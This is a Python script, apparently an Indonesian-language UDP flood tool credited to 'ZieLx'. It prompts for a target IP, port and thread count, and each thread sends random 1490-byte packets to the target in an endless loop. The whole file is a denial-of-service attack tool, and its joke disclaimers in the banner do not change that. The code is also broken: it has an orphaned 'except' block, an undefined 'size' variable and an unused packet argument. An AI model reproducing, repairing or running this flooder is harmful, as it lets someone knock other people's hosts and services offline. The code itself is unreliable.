import threading
import socket
import random
import sys
import time 
import os
    
except ImportError as e:
    print(f"\033[1;31m[Kesalahan] \033[0m\xBB {e}")
    sys.exit()

def random_phrase():
    ppl = ["ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "Jangan Di Rename", "Kalo Mau Rename Pm Dc Gw"]
    phrase = ["Jangan Di Pake", "Buat Abuse", "Digunakan Dengan", "Bijak", "Kalo Salah Tanggung", "Sendiri", "Jangan Disalahin Yang Punya", "Jangan Di Rename", "Kalo Mau Rename Ijin", "Masukan Type"]
    return random.choice(ppl) + " " + random.choice(phrase)

def banner():
    print(f"""\033[2;31m
     
█████████████████████████████
█░▄▄░▄█▄─▄█▄─▄▄─█▄─▄███▄─▀─▄█
██▀▄█▀██─███─▄█▀██─██▀██▀─▀██
▀▄▄▄▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄█▄▄▀{random_phrase()}

    \033[2;33mVersion: 2.3 \t Author : ZieLx \n\033[0m
    """)

def Runher(ip, port, packet, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random._urandom(1490), (ip, port))
        print(f"\033[1;34m[THREAD {index}] \033[0m\xBB \033[1;35m{size}\033[0m Mengirim Paket Ke Ip And Port \033[1;35m{ip}\033[0m")

def main():
    try:
        if sys.version_info[0] != 3:
            print("\033[1;31m[Kesalahan] \033[0m\xBB Silakan jalankan Tools Ini menggunakan Python 3")
            sys.exit()
        
        if len(sys.argv) < 5:
            banner()

        IP       = input("\033[1;34m[>] \033[2;32mMasukan Ip/Host Target \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
        PORT     = int(input("\033[1;34m[>] \033[2;32mMasukan Port Target \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
        PACKET     = int(input("\033[1;34m[>] \033[2;32mMasukan Jumlah Packet \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
        THREAD    = int(input("\033[1;34m[>] \033[2;32mMasukan Jumlah Threads \xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])


        if PORT > 65535 or PORT < 1:
            print("\n\033[1;31m[Kesalahan] \033[0m\xBB Silakan, pilih port antara 1 dan 65535")
            sys.exit(1)

        if PACKET > 65500 or PACKET < 1:
            print("\n\033[1;31m[Kesalahan] \033[0m\xBB Silakan, pilih Packet antara 1 dan 65500")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] \033[0m Keluar...")
        sys.exit()
    
    except Exception as e:
        print(f"\n\033[1;31m[Kesalahan] \033[0m\xBB {e}")
        sys.exit()

    for i in range(THREAD):
        try:
            t = threading.Thread(target=Runher, args=(IP, PORT, PACKET, i))
            t.start()
        except Exception as e:
            print(f"\n\033[1;31m[Kesalahan] \033[0m\xBB Terjadi kesalahan saat menginisialisasi threads {i}: {e}")            

if __name__ == "__main__":
    main()
